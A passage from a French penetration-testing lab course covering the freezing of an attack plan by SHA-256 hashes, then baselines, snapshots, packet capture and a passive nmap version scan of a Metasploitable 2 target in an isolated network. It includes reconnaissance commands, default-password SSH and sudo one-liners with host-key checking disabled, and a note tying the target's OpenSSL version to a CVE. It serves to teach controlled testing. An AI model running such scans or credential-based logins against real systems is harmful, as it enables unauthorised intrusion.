**But** — figer les quatre fichiers du plan par leurs empreintes et consigner le gel dans un procès-verbal.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — plan maître complété à l'étape 6 ; `journal-execution.csv` présent dans le répertoire de travail (copié depuis `modeles/` ; l'étape 8 le recopie pour l'initialisation).

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
cp modeles/PV-gel-plan-v1.0.md PV-gel-plan-v1.0.md
sha256sum plan-attaque-maitre.md inventaire-techniques.csv journal-execution.csv navigator-chapitres-1-5.json
```

**Explication de la commande**

- `cp modeles/PV-gel-plan-v1.0.md PV-gel-plan-v1.0.md` : copie le modèle de PV dans le répertoire de travail.
- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier.
- `plan-attaque-maitre.md`, `inventaire-techniques.csv`, `journal-execution.csv` et `navigator-chapitres-1-5.json` : les quatre fichiers gelés.
- Si `journal-execution.csv` n'existe pas encore, copiez-le depuis `modeles/` avant le calcul ; l'étape 8 le recopie pour l'initialisation.
- Recopiez les quatre empreintes dans le PV, avec la date de gel, le périmètre, la liste des fichiers et les signatures.
- Piège courant : modifier un fichier après le calcul ; `sha256sum -c` échoue alors, ce qui est le comportement attendu. Un changement de commande impose un nouveau gel et un nouveau test.

**Résultat attendu**

Quatre empreintes SHA-256 affichées, puis recopiées dans le PV.

**Preuve** — `preuves/ch1-lab3/PV-gel-plan-v1.0.md` et les empreintes du PV, vérifiées à l'étape 11.

#### Étape 8 — Vérifier le journal d'exécution

**But** — initialiser le journal depuis le modèle et contrôler son en-tête, son nombre de lignes et la couverture des labs.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — modèle `modeles/journal-execution.csv` présent.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
cp modeles/journal-execution.csv journal-execution.csv
head -1 journal-execution.csv
wc -l journal-execution.csv
awk -F, 'NR>1 {print $6}' journal-execution.csv | sort | uniq -c
```

**Explication de la commande**

- `cp modeles/journal-execution.csv journal-execution.csv` : copie le modèle de journal dans le répertoire de travail.
- `head -1 journal-execution.csv` : affiche uniquement l'en-tête, pour vérifier l'ordre des colonnes.
- `wc -l journal-execution.csv` : compte les lignes, en-tête compris.
- `awk -F, 'NR>1 {print $6}'` : découpe chaque ligne sur la virgule et affiche la sixième colonne, `cible`, pour toutes les lignes sauf l'en-tête.
- `sort | uniq -c` : compte les occurrences de chaque valeur.
- La couverture des labs se lit dans la cinquième colonne, `chapitre_lab` ; le comptage de la sixième colonne porte sur les cibles.
- Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`. Une ligne sans preuve ni rollback n'est pas exécutable.
- Piège courant : modifier l'ordre des colonnes ; le script de contrôle lit les colonnes par position.

**Résultat attendu**

```text
id,tactique,technique,sous_technique,chapitre_lab,cible,prerequis,outil_commande,resultat_attendu,preuve,detection,mitigation,statut,rollback,notes
45 journal-execution.csv
```

Le journal contient 44 lignes d'étapes. La colonne `chapitre_lab` doit couvrir Ch1 Lab1 à Lab6.

**Preuve** — `preuves/ch1-lab3/journal-execution.csv`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 9 — Remplir une fiche dry-run

**But** — produire la fiche go/no-go d'une technique, avec commande exacte, preuve, détection, mitigation et rollback.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — modèle `modeles/fiche-dry-run.md` présent ; technique `T1046` retenue dans le plan.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
cp modeles/fiche-dry-run.md fiche-dry-run-T1046.md
```

**Explication de la commande**

- `cp` : copie le modèle de fiche dry-run.
- `modeles/fiche-dry-run.md` : modèle fourni avec le chapitre.
- `fiche-dry-run-T1046.md` : fiche dédiée à la technique `T1046`.
- Complétez ensuite : technique et sous-technique, cible et port, prérequis, commande exacte, résultat attendu, preuve attendue, détection, mitigation, rollback et critère go/no-go.
- Piège courant : laisser le rollback vide ; une fiche sans rollback est refusée.

**Résultat attendu**

Une fiche complète, sans case vide, pour la technique `T1046`.

**Preuve** — `preuves/ch1-lab3/fiche-dry-run-T1046.md`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 10 — Lancer le contrôle automatique

**But** — vérifier en une passe la présence, la structure et la cohérence des livrables du plan.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — étapes 1 à 9 terminées ; livrables présents dans le répertoire de travail.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
prouve verifie-lab3.txt bash scripts/verifie-lab3.sh .
```

**Explication de la commande**

- `prouve verifie-lab3.txt` : enregistre toute la sortie du contrôle dans une preuve.
- `bash` : exécute le script avec l'interpréteur Bash.
- `scripts/verifie-lab3.sh` : script de contrôle fourni avec le chapitre.
- `.` : répertoire à contrôler, ici le répertoire de travail courant.
- Le script vérifie la présence des fichiers, l'en-tête, le nombre de lignes, l'unicité, les legacy, le JSON et le nombre de techniques.
- `RESULTAT: PASS` est la seule sortie acceptée ; si le script affiche `FAIL`, corrigez le fichier concerné, puis relancez.
- Piège courant : lancer le script depuis `/home/kali` ; le `.` ne pointe alors pas vers les livrables.

**Résultat attendu**

```text
PASS  present: plan-attaque-maitre.md
PASS  present: inventaire-techniques.csv
PASS  present: journal-execution.csv
PASS  present: navigator-chapitres-1-5.json
PASS  present: PV-gel-plan-v1.0.md
PASS  en-tete inventaire conforme
PASS  inventaire: 68 lignes (>= 40)
PASS  identifiants uniques
PASS  legacy conserve: T1043
...
PASS  Navigator JSON valide
INFO  techniques dans la couche: 67
---
RESULTAT: PASS
```

**Preuve** — `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 11 — Geler et archiver

**But** — produire les sommes de contrôle, vérifier l'intégrité, puis créer l'archive finale du plan.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — étapes 1 à 10 terminées ; contrôle automatique `PASS`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
sha256sum plan-attaque-maitre.md inventaire-techniques.csv journal-execution.csv \
  navigator-chapitres-1-5.json PV-gel-plan-v1.0.md > SHA256SUMS
sha256sum -c SHA256SUMS
tar -czf ch1-lab3-plan.tar.gz plan-attaque-maitre.md PV-gel-plan-v1.0.md \
  inventaire-techniques.csv journal-execution.csv navigator-chapitres-1-5.json \
  fiche-dry-run-T1046.md SHA256SUMS
```

**Explication de la commande**

- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier listé.
- `> SHA256SUMS` : écrit les empreintes dans un fichier de sommes.
- `sha256sum -c SHA256SUMS` : relit le fichier de sommes et vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
- `-c` : mode de vérification.
- `tar -czf ch1-lab3-plan.tar.gz` : crée une archive compressée.
- `-c` : crée l'archive ; `-z` : compresse avec gzip ; `-f` : indique le nom du fichier d'archive.
- Les fichiers listés après le nom de l'archive sont ajoutés : plan, PV, inventaire, journal, couche, fiche dry-run et sommes.
- Piège courant : inclure `SHA256SUMS` dans son propre calcul ; il faut créer le fichier de sommes après les autres fichiers.

**Résultat attendu**

Chaque fichier affiche `OK`, puis l'archive est créée.

**Preuve** — `preuves/ch1-lab3/SHA256SUMS` et `preuves/ch1-lab3/ch1-lab3-plan.tar.gz`.

### En conclusion

Vous avez un plan maître gelé, un inventaire de 68 techniques, une couche Navigator de 67 techniques et un contrôle automatique `PASS`. Le Lab-04 applique ce plan à la première phase d'exécution.

**Résultats attendus**

| Élément | Valeur attendue | Vérification |
|---|---:|---|
| Lignes du CSV | 69 (1 en-tête + 68) | `wc -l` |
| Identifiants uniques | 68 | `uniq -d` vide |
| Legacy conservés | 6 | `grep` |
| Techniques Navigator | 67 | `len(d["techniques"])` |
| Entrées de séquencement | 24 | plan section 5 |
| Lignes du journal | 44 | `wc -l` |
| Contrôle final | `PASS` | `verifie-lab3.sh` |

**Critères de réussite**

- [ ] L'inventaire contient au moins 40 techniques et aucun doublon.
- [ ] Les six identifiants legacy sont présents.
- [ ] La couche Navigator est un JSON valide et contient 67 techniques.
- [ ] T119 est exclu de la couche et l'exclusion est documentée.
- [ ] Le plan maître contient 24 entrées et 14 tactiques statuées.
- [ ] Le PV de gel contient les empreintes des quatre fichiers.
- [ ] Le journal contient 44 lignes avec un en-tête complet.
- [ ] Une fiche dry-run est complète pour `T1046`.
- [ ] `verifie-lab3.sh` retourne `PASS`.
- [ ] L'archive finale est créée et `sha256sum -c` retourne `OK`.

## Lab-04 — Baseline, snapshots et première phase d'exécution

### Énoncé / Contexte

Avant d'exécuter une phase du plan, il faut une **référence** : l'état réseau et les services de chaque VM, une session terminal journalisée, une capture réseau de contrôle et un snapshot restaurable. Ce lab produit cette référence, puis exécute la première phase en mode passif (`-sV`), sans exploitation.

**Place dans la chaîne** — après le gel du plan (Lab-03), avant l'énumération approfondie (Lab-05).

**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :

- distinguer l'hôte, Kali et Metasploitable 2 dans une baseline ;
- créer et vérifier un snapshot `avant-phase1` ;
- journaliser une session avec `script` et nettoyer les séquences ANSI ;
- capturer et relire cinq paquets ICMP avec `tcpdump` ;
- remplir quatre fiches dry-run ;
- produire un inventaire de preuves qui ne s'inclut pas lui-même ;
- comparer la phase 1 au plan gelé.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Discovery (TA0007), Resource Development (TA0042) |
| Techniques | T1016 System Network Configuration Discovery ; T1046 Network Service Discovery ; T1588.006 Vulnerabilities ; T1119 Automated Collection |
| Source de données | Configuration réseau, journaux de session, capture réseau, inventaire de fichiers |
| Contrôle défensif | Snapshot, journalisation, comparaison au plan gelé |
| Détection | Modification de configuration, capture réseau non planifiée, écart plan/journal |

**Prérequis**

- Labs 1 à 3 terminés : empreinte, matrice CVE, plan gelé.
- Snapshots disponibles. Sur Metasploitable 2, le snapshot `avant-phase1` est créé à l'étape 4. Sur Kali, un snapshot propre existant suffit.
- `script`, `tcpdump`, `ss`, `ip`, `sha256sum` sur Kali.
- `VBoxManage` sur l'hôte.
- Répertoire de travail : `preuves/ch1-lab4/`.
- La fonction `prouve` du Lab-01 est définie sur Kali **et** sur l'hôte. Sinon, redéfinissez-la dans chaque shell.
- Les chemins `preuves/...` sont relatifs à `/home/kali` sur Kali et à la racine du dépôt sur l'hôte. Copiez les preuves Kali vers le dépôt avec `scp` avant l'étape 11.

> **Règle de rollback** — si la cible ne répond plus, si un service change d'état sans commande planifiée, ou si une capture montre un trafic hors `192.168.56.0/24`, arrêtez et restaurez le snapshot. Le rollback n'est pas une option : c'est une étape du plan.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `VBoxManage` | `snapshot take`, `snapshot list`, `snapshot restore` | Snapshots et restauration depuis l'hôte |
| `script` | `script -q -c ... session.typescript` | Capture de session terminal |
| `tcpdump` | `tcpdump -c 5 -nn -i vboxnet0` | Capture réseau de référence |
| `ping` / `nmap` | `ping`, `nmap -sV` | Trafic contrôlé et phase 1 passive |
| `sha256sum` / `scp` | `sha256sum`, `scp -r` | Archivage et intégrité |

### Commande et laboratoire étape par étape

#### Étape 1 — Baseline de l'hôte

**But** — enregistrer l'adresse, la route et les ports en écoute de l'hôte avant toute manipulation.

**Machine** — hôte d'hypervision, `192.168.56.1`.

**Prérequis** — shell à la racine du dépôt ; fonction `prouve` définie sur l'hôte.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/host-ip.txt ip -br a
prouve preuves/ch1-lab4/host-route.txt ip route
prouve preuves/ch1-lab4/host-services.txt bash -c "ss -tulpn"
```

**Explication de la commande**

- `prouve ... host-ip.txt` : enregistre la sortie de la commande et son code retour.
- `ip -br a` : affiche les interfaces réseau en format abrégé.
- `prouve ... host-route.txt` : enregistre la table de routage.
- `ip route` : affiche les routes, dont celle du réseau host-only.
- `prouve ... host-services.txt` : enregistre les ports en écoute.
- `bash -c "ss -tulpn"` : exécute `ss` dans un shell enfant ; les options affichent les sockets TCP et UDP, en écoute, avec les numéros de port et les processus.
- Piège courant : lancer `ss` sans privilèges et ne pas voir les processus ; identifiez tout service inattendu avant de capturer.

**Résultat attendu**

L'interface `vboxnet0` porte `192.168.56.1/24`, la route `192.168.56.0/24` est directement connectée, et aucun service du laboratoire n'écoute sur l'hôte.

**Preuve** — `preuves/ch1-lab4/host-ip.txt`, `host-route.txt` et `host-services.txt`.

#### Étape 2 — Baseline de Kali

**But** — enregistrer l'adresse, la route et les ports en écoute de Kali, qui servent de référence pour détecter tout écart ultérieur.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — accès SSH à Kali ; fonction `prouve` définie.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/kali-ip.txt ip -br a
prouve preuves/ch1-lab4/kali-route.txt ip route
prouve preuves/ch1-lab4/kali-services.txt bash -c "echo kali | sudo -S -p '' ss -tulpn"
```

**Explication de la commande**

- `prouve ... kali-ip.txt` : enregistre les interfaces de Kali.
- `ip -br a` : affiche les interfaces en format abrégé.
- `prouve ... kali-route.txt` : enregistre la table de routage.
- `ip route` : affiche les routes.
- `prouve ... kali-services.txt` : enregistre les ports en écoute avec les processus.
- `echo kali | sudo -S -p ''` : fournit le mot de passe `kali` à `sudo` sur l'entrée standard, sans invite.
- `ss -tulpn` : sockets TCP et UDP, en écoute, avec ports et processus.
- Piège courant : oublier `sudo` et ne pas voir les PID ; notez tout service inattendu, il peut fausser la capture.

**Résultat attendu**

```text
eth0             UP             192.168.56.101/24
192.168.56.0/24 dev eth0 proto kernel scope link src 192.168.56.101 metric 100

Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=806,fd=6))
```

Seul SSH écoute sur Kali. Si un autre service apparaît, notez-le : il peut fausser la capture.

**Preuve** — `preuves/ch1-lab4/kali-ip.txt`, `kali-route.txt` et `kali-services.txt`.

#### Étape 3 — Baseline de Metasploitable 2

**But** — relever depuis Kali l'adresse, la route, les ports et les versions logicielles exactes de Metasploitable 2.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — SSH à Metasploitable 2 avec le compte `msfadmin` ; `sshpass` installé sur Kali.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
SSH="sshpass -p msfadmin ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.103"

prouve preuves/ch1-lab4/meta-ip.txt bash -c "$SSH 'ip a'"
prouve preuves/ch1-lab4/meta-route.txt bash -c "$SSH 'ip route'"
prouve preuves/ch1-lab4/meta-services.txt bash -c "$SSH 'echo msfadmin | sudo -S -p \"\" netstat -tulpn'"
prouve preuves/ch1-lab4/meta-versions.txt bash -c "$SSH 'uname -a; openssl version; dpkg-query -W openssl apache2 php5-cgi 2>/dev/null'"
```

**Explication de la commande**

- `SSH="sshpass -p msfadmin ssh ..."` : définit une variable qui contient la commande SSH complète vers Metasploitable 2.
- `sshpass -p msfadmin` : fournit le mot de passe du compte `msfadmin`.
- `-q` : supprime les avertissements SSH.
- `-o StrictHostKeyChecking=no` et `-o UserKnownHostsFile=/dev/null` : évitent l'empreinte persistante et l'invite de première connexion.
- `-oHostKeyAlgorithms=+ssh-rsa` et `-oPubkeyAcceptedAlgorithms=+ssh-rsa` : autorisent les algorithmes anciens de la cible.
- `prouve ... meta-ip.txt bash -c "$SSH 'ip a'"` : exécute `ip a` sur la cible et enregistre la sortie.
- Les commandes suivantes enregistrent la route, les ports en écoute et les versions.
- `netstat -tulpn` : équivalent ancien de `ss` sur Metasploitable 2.
- `dpkg-query -W openssl apache2 php5-cgi` : affiche les versions des paquets installés.
- Piège courant : conclure depuis la bannière Nmap ; la version exacte du noyau se lit dans la VM.

**Résultat attendu**

```text
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
OpenSSL 0.9.8g 19 Oct 2007
apache2 2.2.8-1
openssl 0.9.8g-4ubuntu3
php5-cgi 5.2.4-2ubuntu5.10
```

La version exacte du noyau est `2.6.24-16-server`. Elle complète l'estimation Nmap du Lab-01. La version OpenSSL `0.9.8g-4ubuntu3` est dans la plage de CVE-2008-0166 (`< 0.9.8g-9`). Meta expose de nombreux services, dont `rmiregistry` sur un port éphémère ; Apache `2.2.8-1` et PHP `5.2.4-2ubuntu5.10` complètent l'empreinte.

**Preuve** — `preuves/ch1-lab4/meta-ip.txt`, `meta-route.txt`, `meta-services.txt` et `meta-versions.txt`.

#### Étape 4 — Créer et vérifier le snapshot

**But** — disposer d'un point de restauration nommé `avant-phase1` avant toute action sur la cible.

**Machine** — hôte d'hypervision, `192.168.56.1`.

**Prérequis** — VM `Metasploitable2` éteinte ou suspendue ; `VBoxManage` disponible sur l'hôte.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/snapshot-create.txt bash -c \
  "VBoxManage snapshot Metasploitable2 take avant-phase1"
prouve preuves/ch1-lab4/snapshot-list.txt bash -c \
  "VBoxManage snapshot Metasploitable2 list"
prouve preuves/ch1-lab4/snapshot-kali-list.txt bash -c "VBoxManage snapshot Kali list"
```

**Explication de la commande**

- `prouve ... snapshot-create.txt bash -c "..."` : enregistre la création du snapshot et son code retour.
- `VBoxManage snapshot Metasploitable2 take avant-phase1` : crée le snapshot nommé `avant-phase1` de la VM `Metasploitable2`.
- `prouve ... snapshot-list.txt` : enregistre la liste des snapshots de la cible.
- `VBoxManage snapshot Metasploitable2 list` : vérifie que le snapshot existe et affiche son UUID.
- `prouve ... snapshot-kali-list.txt` : enregistre la liste des snapshots de Kali.
- `VBoxManage snapshot Kali list` : vérifie le snapshot propre existant de Kali.
- Si le snapshot existe déjà, `VBoxManage` retourne une erreur : vérifiez son nom avec `list`, ne le supprimez pas et notez la date de création.
- Piège courant : créer `avant-phase1` après avoir déjà exécuté la phase 1 ; le snapshot ne sert alors à rien.

**Résultat attendu**

```text
Name: avant-phase1 (UUID: ...)
```

**Preuve** — `preuves/ch1-lab4/snapshot-create.txt`, `snapshot-list.txt` et `snapshot-kali-list.txt`.

#### Étape 5 — Journaliser une session terminal

**But** — conserver une trace brute d'une session, puis en produire une version lisible sans séquences ANSI.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `script` et `sed` installés ; répertoire `preuves/ch1-lab4/` existant.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/script-session.txt bash -c \
  "script -q -c 'ip route; ss -tln' preuves/ch1-lab4/session.typescript"
sed -r 's/\x1B\[[0-9;]*[mK]//g' preuves/ch1-lab4/session.typescript \
  > preuves/ch1-lab4/session-clean.txt
```

**Explication de la commande**

- `prouve ... script-session.txt` : enregistre l'exécution de `script` et son code retour.
- `script -q -c 'ip route; ss -tln' preuves/ch1-lab4/session.typescript` : lance une session journalisée.
- `-q` : mode silencieux, sans message de démarrage.
- `-c 'ip route; ss -tln'` : exécute les deux commandes dans la session.
- `preuves/ch1-lab4/session.typescript` : fichier brut de la session.
- `sed -r 's/\x1B\[[0-9;]*[mK]//g'` : supprime les séquences ANSI de couleur et de déplacement.
- `> preuves/ch1-lab4/session-clean.txt` : écrit la version nettoyée.
- Piège courant : supprimer le fichier brut ; il prouve que la session n'a pas été réécrite.

**Résultat attendu**

`session.typescript` contient l'en-tête `Script started`, la route, les ports en écoute et `Script done`. `session-clean.txt` ne contient plus de séquences ANSI.

**Preuve** — `preuves/ch1-lab4/session.typescript` et `preuves/ch1-lab4/session-clean.txt`.

#### Étape 6 — Capturer et relire cinq paquets ICMP

**But** — produire une capture réseau de référence limitée au trafic de contrôle entre Kali et Metasploitable 2.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `tcpdump` et `ping` installés ; accès `sudo` sur Kali.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/tcpdump.txt bash -c \
  "echo kali | sudo -S -p '' sh -c 'timeout 12 tcpdump -i eth0 -c 5 -nn -w preuves/ch1-lab4/tcpdump-baseline.pcap icmp & sleep 1; ping -c 3 192.168.56.103 >/dev/null; wait'"
prouve preuves/ch1-lab4/tcpdump-read.txt tcpdump -nn -r preuves/ch1-lab4/tcpdump-baseline.pcap
```

**Explication de la commande**

- `prouve ... tcpdump.txt` : enregistre la sortie de la capture et son code retour.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo` sans invite.
- `sh -c '...'` : exécute la séquence dans un shell enfant.
- `timeout 12` : borne la capture à 12 secondes.
- `tcpdump -i eth0` : capture sur l'interface Kali connectée au réseau host-only ; côté hôte, l'interface équivalente est `vboxnet0`.
- `-c 5` : arrête après cinq paquets capturés.
- `-nn` : désactive la résolution DNS et des noms de ports.
- `-w preuves/ch1-lab4/tcpdump-baseline.pcap` : écrit la capture au format pcap.
- `icmp` : filtre uniquement le protocole ICMP.
- `&` : place la capture en arrière-plan ; `sleep 1` laisse le temps de démarrer ; `ping -c 3 192.168.56.103` génère le trafic ; `wait` attend la fin de la capture.
- `tcpdump -nn -r ...` : relit la capture sans résolution de noms.
- Piège courant : lancer le ping avant la capture, ou capturer sur une interface qui ne porte pas `192.168.56.0/24`.

**Résultat attendu**

```text
5 packets captured
6 packets received by filter
0 packets dropped by kernel

23:12:12.620301 IP 192.168.56.101 > 192.168.56.103: ICMP echo request, id 21324, seq 1, length 64
23:12:12.620612 IP 192.168.56.103 > 192.168.56.101: ICMP echo reply, id 21324, seq 1, length 64
```

La capture prouve que le trafic de contrôle reste dans `192.168.56.0/24`. Elle sert de référence pour le Lab-05. Si la capture contient du trafic hors de ce réseau, arrêtez et vérifiez les interfaces.

**Preuve** — `preuves/ch1-lab4/tcpdump.txt`, `preuves/ch1-lab4/tcpdump-read.txt` et `preuves/ch1-lab4/tcpdump-baseline.pcap`.

#### Étape 7 — Exécuter la phase 1 en mode passif

**But** — relever les versions des services ciblés et comparer le résultat au plan gelé, sans lancer d'exploit.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — plan gelé au Lab-03 ; `nmap` installé ; accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/phase1-versions.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sS -n -sV -p 21,22,80,139,445,3306,5432 192.168.56.103"
```

**Explication de la commande**

- `prouve ... phase1-versions.txt` : enregistre la sortie Nmap et son code retour.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- `nmap` : lance le scanner réseau.
- `-sS` : scan SYN, demi-connexion TCP.
- `-n` : aucune résolution DNS.
- `-sV` : détection des versions de services ; c'est le mode passif de cette phase.
- `-p 21,22,80,139,445,3306,5432` : ports FTP, SSH, HTTP, SMB, MySQL et PostgreSQL.
- `192.168.56.103` : cible Metasploitable 2.
- Piège courant : modifier le plan gelé après un écart ; créez un avenant. Un port fermé ne prouve pas l'absence de vulnérabilité.

**Résultat attendu**

Les versions de FTP, SSH, HTTP, SMB, MySQL et PostgreSQL. Comparez avec le plan gelé :

- si la version correspond, marquez l'étape `Exécuté` ;
- si la version diffère, marquez `Bloqué` et documentez l'écart ;
- si le port est fermé, ne concluez pas à une vulnérabilité : vérifiez le service sur la cible.

**Preuve** — `preuves/ch1-lab4/phase1-versions.txt`.

#### Étape 8 — Remplir quatre fiches dry-run

**But** — préparer les fiches go/no-go des quatre techniques sensibles retenues dans le plan, sans les exécuter.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — modèle `modeles/fiche-dry-run.md` présent.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
mkdir -p preuves/ch1-lab4/dry-run
for f in T1190-sqli T1203-T1068-buffer-overflow T1498-T1499-dos T1550.002-T1110-credentials; do
  cp modeles/fiche-dry-run.md "preuves/ch1-lab4/dry-run/$f.md"
done
ls -l preuves/ch1-lab4/dry-run
```

**Explication de la commande**

- `mkdir -p preuves/ch1-lab4/dry-run` : crée le répertoire des fiches sans erreur s'il existe déjà.
- `for f in ...; do ... done` : boucle sur les quatre noms de fiches.
- `T1190-sqli`, `T1203-T1068-buffer-overflow`, `T1498-T1499-dos` et `T1550.002-T1110-credentials` : techniques couvertes.
- `cp modeles/fiche-dry-run.md "preuves/ch1-lab4/dry-run/$f.md"` : copie le modèle sous le nom de chaque technique.
- `ls -l` : vérifie la création des quatre fichiers.
- Complétez chaque fiche avec la cible, la commande, le résultat attendu, la preuve, la détection, la mitigation et le rollback.
- Piège courant : valider une fiche sans rollback ; elle est refusée.

**Résultat attendu**

Quatre fichiers de 1 889 octets.

> **Périmètre** — les fiches `T1498/T1499` (déni de service) et `T1550.002/T1110` (credentials) sont des **fiches de planification**. Elles ne sont pas exécutées dans ce chapitre. Leur présence prouve que le risque est identifié et encadré, pas qu'il est testé.

**Preuve** — `preuves/ch1-lab4/dry-run/T1190-sqli.md`, `T1203-T1068-buffer-overflow.md`, `T1498-T1499-dos.md` et `T1550.002-T1110-credentials.md`.

#### Étape 9 — Remplir le journal d'exécution

**But** — mettre à jour le journal du plan avec les statuts, les preuves et les notes des étapes Ch1 Lab1 à Lab4.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — modèle `modeles/journal-execution.csv` présent.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
cp modeles/journal-execution.csv preuves/ch1-lab4/journal-execution.csv
head -1 preuves/ch1-lab4/journal-execution.csv
wc -l preuves/ch1-lab4/journal-execution.csv
```

**Explication de la commande**

- `cp modeles/journal-execution.csv preuves/ch1-lab4/journal-execution.csv` : copie le modèle de journal dans les preuves du lab.
- `head -1` : affiche l'en-tête pour vérifier les 15 colonnes.
- `wc -l` : compte les lignes, en-tête compris.
- Remplissez les colonnes `statut`, `preuve` et `notes` pour les étapes Ch1 Lab1 à Lab4.
- Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`.
- Piège courant : un journal sans preuve n'est pas un journal, c'est une intention ; chaque ligne exécutée doit pointer vers une preuve.

**Résultat attendu**

L'en-tête de 15 colonnes et 45 lignes (1 en-tête + 44 étapes).

**Preuve** — `preuves/ch1-lab4/journal-execution.csv`.

#### Étape 10 — Produire un inventaire sans auto-inclusion

**But** — lister les preuves du lab sans inclure le fichier d'inventaire lui-même.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — preuves des étapes 1 à 9 présentes dans `preuves/ch1-lab4/`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab4/inventaire.txt bash -c \
  "find preuves/ch1-lab4 -type f ! -name 'inventaire.txt' ! -name 'INVENTAIRE-GLOBAL.txt' ! -name '*.log' | sort"
grep -c 'inventaire.txt' preuves/ch1-lab4/inventaire.txt
```

**Explication de la commande**

- `prouve ... inventaire.txt` : enregistre la liste des preuves dans un fichier.
- `find preuves/ch1-lab4 -type f` : parcourt les fichiers du répertoire.
- `! -name 'inventaire.txt'` : exclut le fichier de sortie lui-même.
- `! -name 'INVENTAIRE-GLOBAL.txt'` et `! -name '*.log'` : excluent les inventaires consolidés et les journaux.
- `| sort` : trie la liste.
- `grep -c 'inventaire.txt'` : compte les occurrences du nom dans le fichier produit ; la valeur attendue est `0`.
- Piège courant : omettre l'exclusion ; le fichier s'inclut lui-même et la liste change à chaque exécution.

**Résultat attendu**

La liste des preuves, sans la ligne `inventaire.txt`. La vérification affiche `0`.

**Preuve** — `preuves/ch1-lab4/inventaire.txt`.

#### Étape 11 — Copier les preuves Kali vers l'hôte

**But** — rapatrier les preuves produites sur Kali dans le dépôt de l'hôte, sans écraser les preuves déjà présentes.

**Machine** — hôte d'hypervision, `192.168.56.1`, vers Kali `192.168.56.101`.

**Prérequis** — preuves Kali présentes ; `sshpass` et `scp` sur l'hôte.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt

**Exemple de commande**

```bash
